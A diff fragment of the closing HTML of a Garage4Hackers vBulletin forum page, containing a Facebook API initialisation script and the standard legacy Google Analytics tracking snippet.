+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
